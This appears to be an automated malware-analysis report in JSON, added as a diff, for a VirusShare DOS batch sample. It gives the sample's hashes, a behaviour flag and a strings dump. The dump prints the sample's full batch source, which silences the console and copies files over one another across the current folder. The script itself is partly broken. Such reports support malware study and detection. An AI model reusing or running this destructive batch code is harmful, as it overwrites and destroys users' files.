@@ -1,0 +1,49 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off\nctty nul\nif \"%1\"==\"\" goto w01\nif not \"%1\"==\"\" goto w2\ngoto w3\n:w01\nctty nul\nfor %%n in (*.*) do call %0 %n\ngoto w3\nif not \"%toy\"== \"\" goto w02\nset toy=%1\ngoto w3\n:w02\ncopy %1 %toy\nset toy=%1\n:fin"
+    },
+    "filename": "VirusShare_43c11c1935129520d0832aa0751010e5",
+    "filesize": 222,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "43c11c1935129520d0832aa0751010e5",
+        "sha1": "60465fd8da9f068c4edcdc9ba099bace6d0dc956",
+        "sha256": "ee3dc1669d91fa22e6b7d97c7fe1a7eb99b32dbb92936814d3e88e0645a3e726"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "ctty nul",
+            "if \"%1\"==\"\" goto w01",
+            "if not \"%1\"==\"\" goto w2",
+            "goto w3",
+            ":w01",
+            "ctty nul",
+            "for %%n in (*.*) do call %0 %n",
+            "goto w3",
+            "if not \"%toy\"== \"\" goto w02",
+            "set toy=%1",
+            "goto w3",
+            ":w02",
+            "copy %1 %toy",
+            "set toy=%1",
+            ":fin"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.272233",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
